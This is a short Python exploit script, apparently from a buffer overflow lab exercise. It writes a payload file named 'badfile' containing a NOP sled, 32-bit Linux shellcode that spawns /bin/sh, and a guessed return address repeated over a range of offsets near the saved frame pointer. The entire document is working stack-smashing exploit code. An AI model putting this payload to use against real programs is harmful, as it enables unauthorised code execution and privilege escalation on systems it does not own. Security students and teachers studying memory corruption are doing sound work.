import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
#print(len(shellcode))

# Fill the content with NOPs 
content = bytearray(0x90 for i in range(851)) 
# Put the shellcode at the end 
#start = 400 - len(shellcode)
start = 200 
content[start:start+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffd2a8 - 600

ebp_offset = 755
ret_offset = ebp_offset + 4
L = 4
# content[ret_offset:ret_offset+L] = (ret).to_bytes(4,byteorder='little') 

range_amount = 24 # buffer size fluctuates [-24, 24]
ebp_offset_low = ebp_offset - range_amount
ebp_offset_high = ebp_offset + range_amount

count = (int)((ebp_offset_high - ebp_offset_low)/4)

for i in range(0, count):
    content[ebp_offset_low+i*4 : ebp_offset_low + (i+1)*4] = (ret).to_bytes(4,byteorder='little')

# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

